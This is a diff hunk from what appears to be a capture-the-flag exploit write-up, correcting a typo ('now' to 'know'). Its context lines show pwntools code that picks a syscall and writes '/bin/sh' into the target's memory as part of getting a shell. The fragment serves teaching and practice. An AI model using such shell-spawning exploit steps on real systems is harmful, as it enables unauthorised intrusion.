@@ -59,7 +59,7 @@ p.sendlineafter('syscall number to call?',str(0))
 p.send(bin_sh)
 ```
 
-now we have "/bin/sh" in the memory and for mmap stuff we now where it's located.
+now we have "/bin/sh" in the memory and for mmap stuff we know where it's located.
 
 ```python
 p.sendlineafter('Do another (0/1)?',str(0x1))
